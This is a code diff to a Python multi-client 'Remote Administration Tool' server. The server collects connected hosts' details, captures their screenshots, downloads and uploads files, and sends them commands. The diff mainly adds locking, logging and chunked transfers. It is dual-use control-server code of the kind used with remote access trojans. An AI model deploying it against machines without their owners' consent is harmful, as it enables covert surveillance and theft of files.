@@ -4,20 +4,43 @@ import json
 import base64
 import threading
 import time
+import logging
 from datetime import datetime
+from typing import Dict, Optional, Tuple
 
+# Configuration
 HOST = "0.0.0.0"
 PORT = 5000
+MAX_CLIENTS = 10
+BUFFER_SIZE = 65536
+TIMEOUT = 30.0
 
-clients = {}  # {client_id: {"conn": conn, "addr": addr, "info": {}}}
-active_client_id = None
+# Global state
+clients: Dict[str, dict] = {}
+active_client_id: Optional[str] = None
+clients_lock = threading.Lock()
+server_running = False
+
+# Setup logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler('server.log'),
+        logging.StreamHandler()
+    ]
+)
 
 def print_banner():
-    """Display banner"""
+    """Display enhanced banner with system info"""
     print("\n" + "="*80)
-    print("  REMOTE ADMINISTRATION TOOL - Enterprise Edition v2.0")
-    print("  CLI Server with Multi-Client, Screenshot & File Transfer")
+    print("  REMOTE ADMINISTRATION TOOL - Enterprise Edition v3.0")
+    print("  Advanced Multi-Client Server with Enhanced Security")
+    print("  Features: Screenshot | File Transfer | Process Control | System Management")
+    print("="*80)
+    print(f"  Server: {HOST}:{PORT} | Max Clients: {MAX_CLIENTS} | Logging: Enabled")
     print("="*80 + "\n")
+    logging.info("Server banner displayed")
 
 def print_menu():
     """Display menu"""
@@ -51,75 +74,140 @@ def print_menu():
     print("-"*80 + "\n")
 
 def list_clients():
-    """Display all connected clients"""
-    if not clients:
-        print("⚠️  No clients connected\n")
-        return
-    
-    print("\n" + "="*80)
-    print("CONNECTED CLIENTS:")
-    print("="*80)
-    for i, (client_id, data) in enumerate(clients.items(), 1):
-        info = data.get("info", {})
-        active = "🟢 ACTIVE" if client_id == active_client_id else "⚪"
-        print(f"  [{i}] {active} {info.get('hostname', 'Unknown')} - {data['addr'][0]}")
-        print(f"      OS: {info.get('os', 'Unknown')} | User: {info.get('user', 'Unknown')}")
-    print("="*80 + "\n")
+    """Display all connected clients with enhanced info"""
+    with clients_lock:
+        if not clients:
+            print("⚠️  No clients connected\n")
+            logging.info("No clients connected")
+            return
+        
+        print("\n" + "="*80)
+        print(f"CONNECTED CLIENTS ({len(clients)}/{MAX_CLIENTS}):")
+        print("="*80)
+        for i, (client_id, data) in enumerate(clients.items(), 1):
+            info = data.get("info", {})
+            active = "🟢 ACTIVE" if client_id == active_client_id else "⚪"
+            connected_time = data.get("connected_at", "Unknown")
+            print(f"  [{i}] {active} {info.get('hostname', 'Unknown')} - {data['addr'][0]}:{data['addr'][1]}")
+            print(f"      OS: {info.get('os', 'Unknown')} | User: {info.get('user', 'Unknown')}")
+            print(f"      Connected: {connected_time}")
+        print("="*80 + "\n")
+        logging.info(f"Listed {len(clients)} connected clients")
 
 def switch_client():
-    """Switch to different client"""
+    """Switch to different client with validation"""
     global active_client_id
     
-    if not clients:
-        print("⚠️  No clients connected\n")
-        return
+    with clients_lock:
+        if not clients:
+            print("⚠️  No clients connected\n")
+            logging.warning("Switch client failed: No clients connected")
+            return
     
     list_clients()
     
     try:
         choice = int(input("Select client number: "))
-        if 1 <= choice <= len(clients):
-            active_client_id = list(clients.keys())[choice - 1]
-            info = clients[active_client_id].get("info", {})
-            print(f"\n✓ Switched to: {info.get('hostname', 'Unknown')} ({clients[active_client_id]['addr'][0]})\n")
-        else:
-            print("❌ Invalid choice\n")
-    except:
-        print("❌ Invalid input\n")
+        with clients_lock:
+            if 1 <= choice <= len(clients):
+                old_client = active_client_id
+                active_client_id = list(clients.keys())[choice - 1]
+                info = clients[active_client_id].get("info", {})
+                hostname = info.get('hostname', 'Unknown')
+                ip = clients[active_client_id]['addr'][0]
+                print(f"\n✓ Switched to: {hostname} ({ip})\n")
+                logging.info(f"Switched from {old_client} to {active_client_id}")
+            else:
+                print("❌ Invalid choice\n")
+                logging.warning(f"Invalid client choice: {choice}")
+    except ValueError:
+        print("❌ Invalid input - please enter a number\n")
+        logging.error("Invalid input in switch_client")
+    except Exception as e:
+        print(f"❌ Error: {str(e)}\n")
+        logging.error(f"Switch client error: {e}")
 
 def capture_screenshot():
-    """Capture and save screenshot"""
+    """Capture and save screenshot with enhanced error handling"""
     if not active_client_id:
         print("⚠️  No active client\n")
+        logging.warning("Screenshot failed: No active client")
         return
     
     try:
-        conn = clients[active_client_id]["conn"]
+        with clients_lock:
+            if active_client_id not in clients:
+                print("⚠️  Client disconnected\n")
+                logging.error("Screenshot failed: Client disconnected")
+                return
+            conn = clients[active_client_id]["conn"]
+            hostname = clients[active_client_id].get("info", {}).get("hostname", "Unknown")
+        
         print("📸 Requesting screenshot...")
+        logging.info(f"Requesting screenshot from {hostname}")
         
         conn.send("SCREENSHOT".encode())
-        data = conn.recv(1048576)  # 1MB buffer for image
         
-        response = json.loads(data.decode())
+        # Receive data in chunks with progress
+        all_data = b""
+        conn.settimeout(15.0)
+        chunk_count = 0
+        
+        while True:
+            try:
+                chunk = conn.recv(BUFFER_SIZE)
+                if not chunk:
+                    break
+                all_data += chunk
+                chunk_count += 1
+                
+                # Show progress for large transfers
+                if chunk_count % 10 == 0:
+                    print(f"  Receiving... {len(all_data) // 1024}KB")
+                
+                if b'}' in chunk:
+                    break
+            except socket.timeout:
+                logging.warning("Screenshot receive timeout")
+                break
+        
+        if not all_data:
+            print("❌ No data received\n")
+            logging.error("Screenshot failed: No data received")
+            return
+        
+        response = json.loads(all_data.decode())
         
         if response.get("status") == "success":
             img_data = base64.b64decode(response.get("data"))
             
-            filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
+            # Create screenshots directory if not exists
+            os.makedirs("screenshots", exist_ok=True)
+            filename = f"screenshots/screenshot_{hostname}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
+            
             with open(filename, 'wb') as f:
                 f.write(img_data)
             
-            print(f"✓ Screenshot saved: {filename}\n")
+            size_mb = len(img_data) / (1024 * 1024)
+            print(f"✓ Screenshot saved: {filename} ({size_mb:.2f}MB)\n")
+            logging.info(f"Screenshot saved: {filename} ({size_mb:.2f}MB)")
         else:
-            print(f"❌ Screenshot failed: {response.get('message')}\n")
+            error_msg = response.get('message', 'Unknown error')
+            print(f"❌ Screenshot failed: {error_msg}\n")
+            logging.error(f"Screenshot failed: {error_msg}")
     
+    except json.JSONDecodeError as e:
+        print(f"❌ Invalid response format\n")
+        logging.error(f"Screenshot JSON decode error: {e}")
     except Exception as e:
         print(f"❌ Error: {str(e)}\n")
+        logging.error(f"Screenshot error: {e}")
 
 def download_file():
-    """Download file from client"""
+    """Download file from client with progress tracking"""
     if not active_client_id:
         print("⚠️  No active client\n")
+        logging.warning("Download failed: No active client")
         return
     
     filepath = input("Enter file path on client (e.g., C:\\file.txt): ").strip()
@@ -127,95 +215,229 @@ def download_file():
         return
     
     try:
-        conn = clients[active_client_id]["conn"]
+        with clients_lock:
+            if active_client_id not in clients:
+                print("⚠️  Client disconnected\n")
+                logging.error("Download failed: Client disconnected")
+                return
+            conn = clients[active_client_id]["conn"]
+            hostname = clients[active_client_id].get("info", {}).get("hostname", "Unknown")
+        
         print(f"📥 Downloading {filepath}...")
+        logging.info(f"Downloading {filepath} from {hostname}")
         
         conn.send(f"DOWNLOAD:{filepath}".encode())
-        data = conn.recv(10485760)  # 10MB buffer
         
-        response = json.loads(data.decode())
+        # Receive large files in chunks with progress
+        all_data = b""
+        conn.settimeout(TIMEOUT)
+        chunk_count = 0
+        
+        while True:
+            try:
+                chunk = conn.recv(BUFFER_SIZE)
+                if not chunk:
+                    break
+                all_data += chunk
+                chunk_count += 1
+                
+                # Show progress
+                if chunk_count % 10 == 0:
+                    print(f"  Receiving... {len(all_data) // 1024}KB")
+                
+                if b'}' in chunk:
+                    break
+            except socket.timeout:
+                logging.warning("Download receive timeout")
+                break
+        
+        if not all_data:
+            print("❌ No data received\n")
+            logging.error("Download failed: No data received")
+            return
+        
+        response = json.loads(all_data.decode())
         
         if response.get("status") == "success":
             file_data = base64.b64decode(response.get("data"))
             filename = response.get("filename")
             
-            with open(filename, 'wb') as f:
+            # Create downloads directory
+            os.makedirs("downloads", exist_ok=True)
+            save_path = f"downloads/{filename}"
+            
+            with open(save_path, 'wb') as f:
                 f.write(file_data)
             
-            print(f"✓ File downloaded: {filename} ({len(file_data)} bytes)\n")
+            size_mb = len(file_data) / (1024 * 1024)
+            print(f"✓ File downloaded: {save_path} ({size_mb:.2f}MB)\n")
+            logging.info(f"File downloaded: {save_path} ({size_mb:.2f}MB)")
         else:
-            print(f"❌ Download failed: {response.get('message')}\n")
+            error_msg = response.get('message', 'Unknown error')
+            print(f"❌ Download failed: {error_msg}\n")
+            logging.error(f"Download failed: {error_msg}")
     
+    except json.JSONDecodeError as e:
+        print(f"❌ Invalid response format\n")
+        logging.error(f"Download JSON decode error: {e}")
     except Exception as e:
         print(f"❌ Error: {str(e)}\n")
+        logging.error(f"Download error: {e}")
 
 def upload_file():
-    """Upload file to client"""
+    """Upload file to client with validation and progress"""
     if not active_client_id:
         print("⚠️  No active client\n")
+        logging.warning("Upload failed: No active client")
         return
     
     filepath = input("Enter local file path to upload: ").strip()
-    if not filepath or not os.path.exists(filepath):
+    if not filepath:
+        return
+    
+    if not os.path.exists(filepath):
         print("❌ File not found\n")
+        logging.error(f"Upload failed: File not found - {filepath}")
+        return
+    
+    if not os.path.isfile(filepath):
+        print("❌ Path is not a file\n")
+        logging.error(f"Upload failed: Not a file - {filepath}")
+        return
+    
+    # Check file size
+    file_size = os.path.getsize(filepath)
+    max_size = 50 * 1024 * 1024  # 50MB limit
+    
+    if file_size > max_size:
+        print(f"❌ File too large: {file_size / (1024*1024):.2f}MB (max 50MB)\n")
+        logging.error(f"Upload failed: File too large - {file_size / (1024*1024):.2f}MB")
         return
     
     try:
-        with open(filepath, 'rb') as f:
-            file_data = base64.b64encode(f.read()).decode()
+        with clients_lock:
+            if active_client_id not in clients:
+                print("⚠️  Client disconnected\n")
+                logging.error("Upload failed: Client disconnected")
+                return
+            conn = clients[active_client_id]["conn"]
+            hostname = clients[active_client_id].get("info", {}).get("hostname", "Unknown")
         
         filename = os.path.basename(filepath)
-        conn = clients[active_client_id]["conn"]
+        print(f"📤 Uploading {filename} ({file_size / 1024:.2f}KB) to {hostname}...")
+        logging.info(f"Uploading {filename} ({file_size / 1024:.2f}KB) to {hostname}")
         
-        print(f"📤 Uploading {filename}...")
+        with open(filepath, 'rb') as f:
+            file_data = base64.b64encode(f.read()).decode()
         
         cmd = f"UPLOAD:{filename}:{file_data}"
         conn.send(cmd.encode())
         
+        conn.settimeout(10.0)
         data = conn.recv(4096)
         response = json.loads(data.decode())
         
         if response.get("status") == "success":
-            print(f"✓ {response.get('message')}\n")
+            msg = response.get('message', 'Upload successful')
+            print(f"✓ {msg}\n")
+            logging.info(f"Upload successful: {filename}")
         else:
-            print(f"❌ Upload failed: {response.get('message')}\n")
+            error_msg = response.get('message', 'Unknown error')
+            print(f"❌ Upload failed: {error_msg}\n")
+            logging.error(f"Upload failed: {error_msg}")
     
+    except json.JSONDecodeError as e:
+        print(f"❌ Invalid response format\n")
+        logging.error(f"Upload JSON decode error: {e}")
     except Exception as e:
         print(f"❌ Error: {str(e)}\n")
+        logging.error(f"Upload error: {e}")
 
 def accept_clients():
-    """Accept multiple clients in background"""
-    server_socket = socket.socket()
+    """Accept multiple clients with enhanced error handling and validation"""
+    global server_running
+    
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server_socket.bind((HOST, PORT))
-    server_socket.listen(5)
     
-    print(f"✓ Server started on {HOST}:{PORT}")
-    print("Waiting for client connections...\n")
-    
-    while True:
-        try:
-            conn, addr = server_socket.accept()
-            
-            # Receive client info
+    try:
+        server_socket.bind((HOST, PORT))
+        server_socket.listen(MAX_CLIENTS)
+        server_running = True
+        
+        print(f"✓ Server started on {HOST}:{PORT}")
+        print(f"  Max clients: {MAX_CLIENTS} | Timeout: {TIMEOUT}s")
+        print("Waiting for client connections...\n")
+        logging.info(f"Server started on {HOST}:{PORT}")
+        
+        while server_running:
             try:
-                data = conn.recv(4096).decode()
-                client_info = json.loads(data)
-            except:
-                client_info = {"hostname": "Unknown", "os": "Unknown", "user": "Unknown"}
-            
-            client_id = f"{addr[0]}:{addr[1]}"
-            clients[client_id] = {
-                "conn": conn,
-                "addr": addr,
-                "info": client_info
-            }
-            
-            print(f"✓ Client connected: {client_info.get('hostname', 'Unknown')} from {addr[0]}")
-            print(f"  Total clients: {len(clients)}\n")
-            
-        except Exception as e:
-            print(f"❌ Accept error: {str(e)}")
+                conn, addr = server_socket.accept()
+                
+                # Check max clients limit
+                with clients_lock:
+                    if len(clients) >= MAX_CLIENTS:
+                        print(f"⚠️  Max clients reached ({MAX_CLIENTS}), rejecting {addr[0]}")
+                        logging.warning(f"Max clients reached, rejecting {addr[0]}")
+                        conn.close()
+                        continue
+                
+                # Receive client info with timeout
+                conn.settimeout(10.0)
+                try:
+                    data = conn.recv(4096).decode('utf-8', errors='ignore')
+                    if data:
+                        client_info = json.loads(data)
+                    else:
+                        client_info = {"hostname": "Unknown", "os": "Unknown", "user": "Unknown"}
+                except socket.timeout:
+                    logging.warning(f"Client info timeout from {addr[0]}")
+                    client_info = {"hostname": "Unknown", "os": "Unknown", "user": "Unknown"}
+                except json.JSONDecodeError as e:
+                    logging.error(f"Invalid client info JSON from {addr[0]}: {e}")
+                    client_info = {"hostname": "Unknown", "os": "Unknown", "user": "Unknown"}
+                
+                # Reset timeout
+                conn.settimeout(None)
+                
+                client_id = f"{addr[0]}:{addr[1]}"
+                
+                with clients_lock:
+                    clients[client_id] = {
+                        "conn": conn,
+                        "addr": addr,
+                        "info": client_info,
+                        "connected_at": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                    }
+                    total = len(clients)
+                
+                hostname = client_info.get('hostname', 'Unknown')
+                os_info = client_info.get('os', 'Unknown')
+                print(f"✓ Client connected: {hostname} ({os_info}) from {addr[0]}")
+                print(f"  Total clients: {total}/{MAX_CLIENTS}\n")
+                logging.info(f"Client connected: {hostname} from {addr[0]} (Total: {total})")
+                
+            except OSError as e:
+                if server_running:
+                    logging.error(f"Accept error: {e}")
+                break
+            except Exception as e:
+                if server_running:
+                    logging.error(f"Unexpected accept error: {e}")
+    
+    except OSError as e:
+        print(f"❌ Server bind error: {e}")
+        print(f"   Port {PORT} may already be in use")
+        logging.error(f"Server bind error: {e}")
+    except Exception as e:
+        logging.error(f"Server error: {e}")
+    finally:
+        server_running = False
+        try:
+            server_socket.close()
+        except:
+            pass
+        logging.info("Server stopped")
 
 # Start server in background
 print_banner()
@@ -224,27 +446,38 @@ time.sleep(1)
 
 # Wait for first client
 print("Waiting for first client to connect...")
-while not clients:
+while True:
+    with clients_lock:
+        if clients:
+            break
     time.sleep(0.5)
 
 # Auto-select first client
-active_client_id = list(clients.keys())[0]
-info = clients[active_client_id].get("info", {})
-print(f"\n✓ Auto-selected: {info.get('hostname', 'Unknown')} ({clients[active_client_id]['addr'][0]})")
+with clients_lock:
+    active_client_id = list(clients.keys())[0]
+    info = clients[active_client_id].get("info", {})
+    addr = clients[active_client_id]['addr'][0]
+print(f"\n✓ Auto-selected: {info.get('hostname', 'Unknown')} ({addr})")
 
 print_menu()
 
 # Main command loop
 while True:
     try:
-        if not active_client_id or active_client_id not in clients:
-            if clients:
-                active_client_id = list(clients.keys())[0]
-            else:
-                print("⚠️  No clients connected. Waiting...")
-                while not clients:
-                    time.sleep(1)
-                active_client_id = list(clients.keys())[0]
+        with clients_lock:
+            if not active_client_id or active_client_id not in clients:
+                if clients:
+                    active_client_id = list(clients.keys())[0]
+                else:
+                    print("⚠️  No clients connected. Waiting...")
+        
+        if not active_client_id:
+            while True:
+                with clients_lock:
+                    if clients:
+                        active_client_id = list(clients.keys())[0]
+                        break
+                time.sleep(1)
         
         cmd = input("Remote-Admin> ")
         
@@ -283,16 +516,21 @@ while True:
         elif cmd == "6":
             cmd = "cd"
         elif cmd == "info":
-            info = clients[active_client_id].get("info", {})
-            print(f"\n{'='*80}")
-            print("CURRENT CLIENT INFO:")
-            print(f"{'='*80}")
-            print(f"  Hostname: {info.get('hostname', 'Unknown')}")
-            print(f"  OS: {info.get('os', 'Unknown')}")
-            print(f"  User: {info.get('user', 'Unknown')}")
-            print(f"  IP: {clients[active_client_id]['addr'][0]}")
-            print(f"  Port: {clients[active_client_id]['addr'][1]}")
-            print(f"{'='*80}\n")
+            with clients_lock:
+                if active_client_id in clients:
+                    info = clients[active_client_id].get("info", {})
+                    addr = clients[active_client_id]['addr']
+                    print(f"\n{'='*80}")
+                    print("CURRENT CLIENT INFO:")
+                    print(f"{'='*80}")
+                    print(f"  Hostname: {info.get('hostname', 'Unknown')}")
+                    print(f"  OS: {info.get('os', 'Unknown')}")
+                    print(f"  User: {info.get('user', 'Unknown')}")
+                    print(f"  IP: {addr[0]}")
+                    print(f"  Port: {addr[1]}")
+                    print(f"{'='*80}\n")
+                else:
+                    print("⚠️  Client disconnected\n")
             continue
         elif cmd == "sysinfo":
             cmd = "SYSINFO"
@@ -326,12 +564,19 @@ while True:
         
         # Send command
         try:
-            conn = clients[active_client_id]["conn"]
+            with clients_lock:
+                if active_client_id not in clients:
+                    print("⚠️  Client disconnected\n")
+                    active_client_id = None
+                    continue
+                conn = clients[active_client_id]["conn"]
             conn.send(cmd.encode())
         except Exception as e:
             print(f"❌ Failed to send command: {str(e)}")
             print("⚠️  Client may have disconnected\n")
-            del clients[active_client_id]
+            with clients_lock:
+                if active_client_id in clients:
+                    del clients[active_client_id]
             active_client_id = None
             continue
         
@@ -341,20 +586,27 @@ while True:
                 conn.close()
             except:
                 pass
-            del clients[active_client_id]
-            active_client_id = None
             
-            if clients:
-                active_client_id = list(clients.keys())[0]
-                info = clients[active_client_id].get("info", {})
-                print(f"✓ Switched to: {info.get('hostname', 'Unknown')}\n")
-            else:
+            with clients_lock:
+                if active_client_id in clients:
+                    del clients[active_client_id]
+                active_client_id = None
+                
+                if clients:
+                    active_client_id = list(clients.keys())[0]
+                    info = clients[active_client_id].get("info", {})
+                    print(f"✓ Switched to: {info.get('hostname', 'Unknown')}\n")
+            
+            if not active_client_id:
                 print("⚠️  No more clients. Waiting for new connection...\n")
-                while not clients:
+                while True:
+                    with clients_lock:
+                        if clients:
+                            active_client_id = list(clients.keys())[0]
+                            info = clients[active_client_id].get("info", {})
+                            print(f"✓ New client connected: {info.get('hostname', 'Unknown')}\n")
+                            break
                     time.sleep(1)
-                active_client_id = list(clients.keys())[0]
-                info = clients[active_client_id].get("info", {})
-                print(f"✓ New client connected: {info.get('hostname', 'Unknown')}\n")
             continue
         
         elif cmd.lower() == "shutdown_client":
@@ -365,23 +617,36 @@ while True:
                 conn.close()
             except:
                 pass
-            del clients[active_client_id]
-            active_client_id = None
             
-            if clients:
-                active_client_id = list(clients.keys())[0]
-                info = clients[active_client_id].get("info", {})
-                print(f"✓ Switched to: {info.get('hostname', 'Unknown')}\n")
-            else:
+            with clients_lock:
+                if active_client_id in clients:
+                    del clients[active_client_id]
+                active_client_id = None
+                
+                if clients:
+                    active_client_id = list(clients.keys())[0]
+                    info = clients[active_client_id].get("info", {})
+                    print(f"✓ Switched to: {info.get('hostname', 'Unknown')}\n")
+            
+            if not active_client_id:
                 print("⚠️  No more clients. Waiting for new connection...\n")
-                while not clients:
+                while True:
+                    with clients_lock:
+                        if clients:
+                            active_client_id = list(clients.keys())[0]
+                            info = clients[active_client_id].get("info", {})
+                            print(f"✓ New client connected: {info.get('hostname', 'Unknown')}\n")
+                            break
                     time.sleep(1)
-                active_client_id = list(clients.keys())[0]
-                info = clients[active_client_id].get("info", {})
-                print(f"✓ New client connected: {info.get('hostname', 'Unknown')}\n")
             continue
         
-        data = conn.recv(65536)
+        # Receive response with timeout
+        conn.settimeout(10.0)
+        try:
+            data = conn.recv(65536)
+        except socket.timeout:
+            print("⚠️  Command timeout\n")
+            continue
         
         if not data:
             print("⚠️  Client disconnected unexpectedly\n")
@@ -389,11 +654,14 @@ while True:
                 conn.close()
             except:
                 pass
-            del clients[active_client_id]
-            active_client_id = None
             
-            if clients:
-                active_client_id = list(clients.keys())[0]
+            with clients_lock:
+                if active_client_id in clients:
+                    del clients[active_client_id]
+                active_client_id = None
+                
+                if clients:
+                    active_client_id = list(clients.keys())[0]
             continue
         
         output = data.decode(errors="ignore")
